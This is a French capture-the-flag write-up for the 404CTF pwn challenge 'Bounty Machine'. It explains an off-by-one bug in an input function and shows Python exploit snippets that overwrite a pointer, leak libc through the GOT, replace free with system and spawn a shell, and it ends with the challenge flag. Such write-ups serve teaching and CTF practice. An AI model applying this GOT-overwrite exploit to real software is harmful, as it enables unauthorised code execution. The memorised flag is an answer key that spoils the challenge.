# Writeup pour `Bounty Machine`

Auteur : *Pwnsard*  
Difficulté : *Facile*

### Notions principales :
- Off by one
- Global offset table

### Protections :

```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   RW-RUNPATH   55 Symbols	  No	0		1		data/chall
```

### Principe

On a une structure stockée sur la bss, que l'on peut éditer autant de fois qu'on le désire :

```C
struct rocket {
    long price;
    char name[0x10];
    char* description;
};
```

La faille réside dans la fonction take_input (horrible je vous l'accorde) :
```C
void take_input(char *buf, size_t len) {
    char c = -1;
    int i = 0;
    while (i <= len && c != '\n') {
        c = getchar();
        buf[i] = c;
        i++;
    }
    buf[i] = 0;
}
```
En effet, on a un off-by-one, c'est à dire que l'on peut écrire un caractère de plus que la taille du buffer. Sachant que `edit_rocket_name` est faite pour écrire autant que la longueur du nom actuellement stocké, on peut dépasser d'un caractère à chaque renommage de la fusée, et ainsi aller réécrire le pointeur `description`, ce qui nous donne un arbitrary read/write.  
Dans ma solution, on peut réécrire le pointeur comme cela : 

```python
def store_value_in_description(value: bytes):
    for i in range(9):
        edit_rocket_name(b"A" * 0x10 + b"B" * i)

    edit_rocket_name(b"A" * 0x10 + value)
```
On peut donc leak la libc au travers de la got (le PIE est désactivé). Puis réécrire la got afin de remplacer l'adresse de `free` par celle de `system`. 

```python
# Overwrite got entry of the free function
store_value_in_description(p64(0x405000))

# We have to reproduce the got entirely, else our new line corrupts parts of the got which causes a crash
got_payload = p64(libc.symbols['system'])
got_payload += p64(libc.symbols['puts'])
got_payload += p64(libc.symbols['strlen'])
got_payload += p64(libc.symbols['printf'])
got_payload += p64(libc.symbols['getchar'])
got_payload += p64(libc.symbols['malloc'])
got_payload += p64(libc.symbols['setvbuf'])
got_payload += p64(libc.symbols['__isoc99_scanf'])
edit_rocket_description(got_payload)
```

En éditant la description pour qu'elle contienne un pointeur vers /bin/sh (qui pointe quelque part dans la libc), il ne reste plus qu'à quitter le programme pour obtenir un shell !

```python
# Description now points to /bin/sh
bin_sh_addr = libc.address + 0x1b1ece
store_value_in_description(p64(bin_sh_addr))

# When freeing the /bin/sh rocket we now get a shell !
free_rocket()
```

### Script de résolution :

Voir `solve.py`

### Flag : 

`404CTF{CEnTR3_5P4t!aL_70U1oU$3_ma74B!4u}`